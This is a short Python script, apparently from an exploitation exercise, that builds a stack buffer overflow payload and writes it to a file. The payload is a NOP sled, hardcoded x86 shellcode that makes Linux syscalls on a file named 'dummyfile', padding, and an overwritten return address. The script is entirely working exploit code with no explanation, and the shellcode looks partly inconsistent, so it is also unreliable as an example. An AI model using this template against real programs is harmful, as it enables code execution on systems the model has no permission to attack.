import struct

# Shellcode (replace with the actual extracted shellcode)
shellcode = b"\xeb\x16\x31\xc0\x04\x08\x04\x02\xbb\x2a\x80\x04\x08\xcd\x80\x31\xc0\x04\x01\xcd\x80\xe8\xe5\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65"

# Buffer size
buffer_size = 64

# Return address (adjust as needed)
return_addr = 0xbffff6a0

# Construct the payload
nop_sled = b"\x90" * 30
payload = nop_sled + shellcode
payload += b"A" * (buffer_size - len(payload))
payload += struct.pack("<I", return_addr)

# Write payload to a file
with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload written to payload.bin")